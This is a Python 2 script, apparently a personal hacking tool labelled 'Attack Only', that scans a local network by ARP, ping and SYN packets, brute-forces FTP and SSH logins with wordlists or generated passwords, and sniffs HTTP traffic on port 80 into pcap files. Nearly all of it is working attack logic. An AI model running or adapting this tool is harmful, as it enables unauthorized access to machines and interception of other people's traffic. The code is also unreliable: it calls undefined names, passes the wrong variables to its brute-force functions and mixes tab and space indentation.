#!/usr/bin/env python2
#-*- coding:utf-8 -*-

__author__='''
[Cs133]
Twitter: @133_cesium
'''
__description__='''
***
The aim of this is to discover who is online in the neightborhood of the same LAN (at the office for example...)
And if some known ports are open and in listenning mode, we try to access them the hard way. :)
That simple.

Steps:
------
1st: ARP check on LAN/24
2nd: Discovering sequence (Hostname for example, if shared) and port scan
3rd: Attacking attempts by BF
***
'''
__license__='''
<+> Under the terms of the GPL v3 License.
'''

import sys
import math
import errno
import socket
import logging
import scapy.route
import scapy.config
from ftplib import FTP
import scapy.layers.l2
from scapy.all import *
from time import strftime
from random import randint
from threading import Thread
from datetime import datetime
from argparse import ArgumentParser
from string import digits,ascii_lowercase
from paramiko import SSHClient, AutoAddPolicy

known_ports 	= [21,22,25,80,443]
big 		= ascii_lowercase + digits
online  	= {}
ips_o,pwd	= [],[]
SYNACK  	= 0x12
RSTACK  	= 0x14
flag,ftop	= 0,0

logging.basicConfig(format='%(asctime)s %(levelname)-5s %(message)s', datefmt='%Y-%m-%d %H:%M:%S', level=logging.DEBUG)
logger = logging.getLogger(__name__)
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


def factorisation(length):
	if length == 1: return length
	return factorisation(length-1)*length

def pwd_aplha(lgr,mode):
	if mode == 'alpha':
		return ''.join(ascii_lowercase[randint(0,len(ascii_lowercase)-1)] for i in range(int(lgr)))
	elif mode == 'digits':
		return ''.join(digits[randint(0,len(digits)-1)] for i in range(int(lgr)))
	else:
		return ''.join(big[randint(0,len(big)-1)] for i in range(int(lgr)))

def generate(mode,lgr):
	stop = False
	if mode == 'alpha':
		len_mode = factorisation(ascii_lowercase)
	elif mode == 'digits':
		len_mode = factorisation(digits)
	else:
		len_mode = factorisation(big)
	try:
		sys.stdout.write('\n\033[94m[+]\033[0m Création aléatoire du Dictionnaire en cours...\n')
		while stop != True:
			psswd = pwd_alpha(lgr,mode)
			if psswd not in pwd: pwd.append(psswd)
			sys.stdout.write('\r\033[94m[+]\033[0m Fulfilling the dictionnary : ' +
					 str(len(pwd)) + ' / '+ str(len_mode))
			sys.stdout.flush()
			if len(pwd) == len_mode:
				stop = True
				sys.stdout.write('\n\033[94m[+]\033[0m Dictionnaire généré.\n')
	except KeyboardInterrupt:
		sys.stdout.write('\n\033[94m[+]\033[0m Génération interrompue avec succès. Longueur : %d.\n' % len(pwd))
		return pwd
	return pwd

def detonate(log,addr,psswd):
	global ftop
	trig = FTP(addr)
	try:
		ret = trig.login(user=log,passwd=psswd)
		trig.quit()
		if "successful" in ret:
			ftop = 1
			sys.stdout.write('\n\n\n\033[94m[+]\033[0m FTP YEAH : ' + addr + ' --> ' + psswd + '\n\n')
	except:
		trig.close()

def ssh_conn(log,addr,passwd):
	global flag
	try:
		client = SSHClient()
		client.set_missing_host_key_policy(AutoAddPolicy())
		client.connect(addr,
			username=log,
			password=psswd,
			timeout=10,
			look_for_keys=False)
		print '\n\n\n\033[94m[+]\033[0m SSH YEAH : ' + addr + ' --> ' + psswd + '\n\n'
		flag = 1
	except:
		pass

def long2net(arg):
	if (arg <= 0 or arg >= 0xFFFFFFFF):
		raise ValueError("Valeur du masque illégale.", hex(arg))
	return 32 - int(round(math.log(0xFFFFFFFF - arg, 2)))

def to_CIDR_notation(bytes_network, bytes_netmask):
	network = scapy.utils.ltoa(bytes_network)
	netmask = long2net(bytes_netmask)
	net = "%s/%s" % (network, netmask)
	if netmask < 16:
		logger.warn("%s est trop gros." % net)
		return None
	return net

def scan_and_print_neighbors(net, interface, timeout=1):
	global ips_o
	logger.info("ARP %s sur %s" % (net, interface))
	try:
		ans, unans = scapy.layers.l2.arping(net, iface=interface, timeout=timeout, verbose=True)
		for s, r in ans.res:
			line = r.sprintf("%Ether.src%  %ARP.psrc%")
			ips_o.append(line.split(' ')[2])
			try:
				hostname = socket.gethostbyaddr(r.psrc)
				line += " " + hostname[0]
			except socket.herror:
				pass
			except KeyboardInterrupt:
				print '[-] L\'utilisateur a choisi l\'interruption du process.'
				break
			logger.info(line)
	except socket.error as e:
		if e.errno == errno.EPERM:
			logger.error("%s. Vous n'etes pas root?", e.strerror)
		else:
			raise

def local_network_scan():
	for network, netmask, _, interface, address in scapy.config.conf.route.routes:
		if network == 0 or interface == 'lo' or address == '127.0.0.1' or address == '0.0.0.0':
			continue
		if netmask <= 0 or netmask == 0xFFFFFFFF:
			continue
		net = to_CIDR_notation(network, netmask)
		if interface != scapy.config.conf.iface:
			logger.warn("Ignore %s car Scapy ne supporte pas ce type d'interface.", net)
			continue
		if net:
			scan_and_print_neighbors(net, interface)

def checkhost(ip):
	global ips_o
	conf.verb = 0
	try:
		ping, no = sr(IP(dst=ip)/ICMP(), timeout=2)
		if ping.res:
			print "[*] La cible est en ligne :", ip
			ips_o.append(ip)
        except socket.error as e:
                if e.errno == errno.EPERM:
                        logger.error("%s. Vous n'etes pas root?", e.strerror)
                else:
                        pass
	except Exception:
		pass

def network_scan(ip):
	mask 	  = [255,255,255,0]
	ipf 	  = ip.split('.')
	pre 	  = [str(int(ipf[i]) & mask[i]) for i in range(len(ipf))]
	ip_reseau = pre[0] + '.' + pre[1] + '.' + pre [2] + '.'
	relicat   = 255 - int(pre[3])
	all_hosts = relicat if relicat != 255 else 255
	return [ip_reseau + str(suffixe) for suffixe in range(int(pre[3]),all_hosts,1)]

def scanner(target):
	global online
	ports_i = []
	for port in known_ports:
		try:
			srcport = randint(20000,40000)
        		conf.verb = 0
        		SYNACKpkt = sr1(IP(dst = target)/TCP(sport = srcport, dport = port, flags = "S"), timeout=2)
        		pktflags = SYNACKpkt.getlayer(TCP).flags
        		if pktflags == SYNACK:
				print '[+] Port Ouvert :', port, 'sur la cible --> ', target
				ports_i.append(port)
	 		else:
	        		RSTpkt = IP(dst = target)/TCP(sport = srcport, dport = port, flags = "R")
				send(RSTpkt)
		except KeyboardInterrupt:
			RSTpkt = IP(dst = target)/TCP(sport = srcport, dport = port, flags = "R")
			send(RSTpkt)
			print "\n[*] La requete de l'utilisateur s'est stoppée..."
		except Exception as e:
			print e
	online[target] = ports_i

def port_scan(ip):
	global ips_o, online
	all_hosts = []
	if ip == get_ip():
		print '[*] Scan du réseau local.'
		local_network_scan()
		if not ips_o:
			sys.exit('\033[91m[-]\033[0m Aucune IP trouvée sur le réseau.\n')
	else:
		all_hosts = network_scan(ip)
		for host in all_hosts:
			proc = Thread(target=checkhost,args=(host,))
			proc.start()
	print ips_o
	if ips_o:
		for ip in ips_o:
			proc = Thread(target=scanner,args=(ip,))
			proc.start()
			proc.join()
	else:
		sys.exit('\033[91m[-]\033[0m Aucune IP trouvée sur le réseau.\n')
	print '\033[94m[+]\033[0m Résumé du scan de ports:\n', online

def get_ip():
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect(("8.8.8.8",80))
	ret = s.getsockname()[0]
	s.close()
	return ret

def get_http_headers(http_payload):
	try:
        	headers_raw = http_payload[:http_payload.index("\r\n\r\n")+2]
        	headers = dict(re.findall(r'(?P<name>.*?):(?P<value>.*?)\r\n', headers_raw))
    	except:
        	return None
	if 'Content-Type' not in headers:
        	return None
    	return headers

def pcap(pc):
    	try:
        	pcap = rdpcap(pc)
        	p = pcap.sessions()
    	except IOError:
        	sys.exit(red + "[-] " + nat + "IOError.")
    	for session in p:
        	idx, flag = 0, 0
        	concat = ''
        	print blu, '\n[ Nouvelle Session = %s ]' % p[session], nat
        	for pkt in p[session]:
        		if pkt.haslayer(TCP) and pkt.haslayer(Raw) and (pkt[TCP].flags == 24L or pkt[TCP].flags == 16):
                		print red, '\nPacket %d -------------- Nouveau Payload -------------\n\n' % idx, nat
                		payload = pkt[TCP].payload
                		load = pkt[TCP].load
                		headers = get_http_headers(load)
                		if headers is not None and ' gzip' in headers.values():
                			print load[:15]
                    			for k,v in headers.iteritems():
                        			print k,':',v
                    			tab = load.split('\r\n')
                    			concat += tab[-1]
                    			flag = 1
                		elif flag != 0 and headers is None:
                    			tab = load.split('\r\n')
                    			concat += tab[-1]
                    			try:
                        			sio = StringIO.StringIO(concat)
                        			gz = gzip.GzipFile(fileobj=sio)
                        			print gz.read()
                        			flag = 0
                        			concat = ''
                    			except:
                        			pass
                		else:
		                	print payload
			idx += 1

def get_args():
	args = ArgumentParser(version='1.5',description='Attack Only, made by Cesium133.')
	args.add_argument('-b','--bruteforce',
		action='store_true',
		default=False,
		help='Argument optionnel pour déclencher le mode attaque.')
	args.add_argument('-i','--ip',
		action='store',
		nargs=1,
		help='Machine cible.')
	args.add_argument('-w','--wordlist',
		action='store',
		nargs=1,
		help='Ajout d\'un dictionnaire.')
	args.add_argument('-u','--username',
		action='store',
		nargs=1,
		default='admin',
		help='Username distant à BF.')
	args.add_argument('-m','--mode',
		action='store',
		nargs=1,
		help='Alphabet de bruteforce [alpha|digits|big].')
	args.add_argument('-l','--longueur',
		action='store',
		nargs=1,
		default='3',
		help='Longueur souhaitée.')
	args.add_argument('-p','--pcap',
		action='store',
		nargs=1,
		help='Analyse un pcap pour déceler les requetes HTTP.')
	return args.parse_args()


# Entry point
if __name__ == '__main__':
	args = get_args()
	user = args.username
	print '\033[94m[+]\033[0m User:', user
	if args.ip is None:	ip = get_ip()
	else: 			ip = args.ip[0]
	print '\033[94m[+]\033[0m IP:', ip

#	from multiprocessing import Pool
#	with open(args.wordlist[0],'r') as dico:
#		pool = Pool(4)
#		pool.map(detonate,dico,4)

	if args.pcap is not None:
		pcap(args.pcap[0])
		sys.exit(0)

	ips = network_scan(ip)
	port_scan(ip)
	
	if args.wordlist is not None:
		try:
			print "\033[94m[+]\033[0m Prise en compte de la wordlist:", args.wordlist[0]
			with open(args.wordlist[0],'rb') as wl:
				dic = wl.read().replace('\r','').split('\n')
		except:
			print '\033[91m[-]\033[0m une erreur est survenue: Ouverture de la wordlist.'
			sys.exit(-1)
	elif args.mode is not None:
		print "[*] Mode:", args.mode[0]
		print "\033[94m[+]\033[0m Generation du dictionnaire (100.000 elements max)."
		print "[*] Longueur des lignes:", args.longueur[0]
		print "[*] Pour interrompre le processus et poursuivre les tests -> [CTRL+C]"
		dic = generate(args.mode[0], args.longueur[0])
	else:
		online = []
		print '[-] Online est vidé.'

	if not online:
		sys.exit('[-] Online est vide après le scan de port.\n')

	if online:
		if args.bruteforce:
			idx = 0
			for host in online:
				if 21 in online[host]:
					print "\033[94m[+]\033[0m Cible avec FTP ouvert : %s." % host
					try:
						for item in dic:
							t = Thread(target=detonate,args=(user,ip,item,))
							t.start()
							idx += 1
							if ftop == 1:
								ftop = 0
								break
					except KeyboardInterrupt:
						print '\n\n[*] Nbr d\'essais '+ str(idx)
						idx = 0
					except Exception as e:
						logger.error("[-] %s", e.strerror)

			for host in online:
				if 22 in online[host]:
					print "\033[94m[+]\033[0m Cible avec SSH ouvert : %s." % host
					try:
						for psswd in dic:
							conn = Thread(target=ssh_conn,args=(user,addr,psswd,))
							conn.start()
							idx += 1
							if flag == 1: break
						if flag == 1:
							flag = 0
							break
					except KeyboardInterrupt:
						print '\n\n[*] Nbr d\'essais '+ str(idx)
						idx = 0
		else:
			for host in online:
				if 80 in online[host]:
					try:
						sniffed = sniff(filter="tcp and port 80 and host " + host, count=100)
						wrpcap(host + '-filtered.pcap', sniffed, append=True)
					except KeyboardInterrupt:
						wrpcap('filtered.pcap', sniffed, append=True)
	else:
		print '\033[91m[-]\033[0m Afin de poursuivre l\'analyse, vous devez mentionner un mode (wordlist / mode de bf).'
		sys.exit(1)
